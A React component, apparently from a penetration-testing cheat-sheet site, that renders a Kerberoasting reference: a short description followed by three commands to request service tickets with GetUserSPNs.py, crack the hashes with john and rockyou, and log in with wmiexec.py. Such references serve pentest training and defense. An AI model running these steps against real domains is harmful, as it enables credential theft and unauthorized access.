import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const Kerberoasting = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              Kerberoasting involves extracting a hash of the encrypted material
              from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP),
              which can be subjected to offline cracking in order to retrieve
              the plaintext password. This is possible because the TGS_REP is
              encrypted using the NTLM password hash of the account in whose
              context the service instance is running.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Get TGT.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"GetUserSPNs.py {DOMAIN}/{USER} -dc-ip {IP} -request"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Crack the hash.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>Login.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wmiexec.py {DOMAIN}/{USER}:{PASSWORD}@{IP}"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default Kerberoasting;
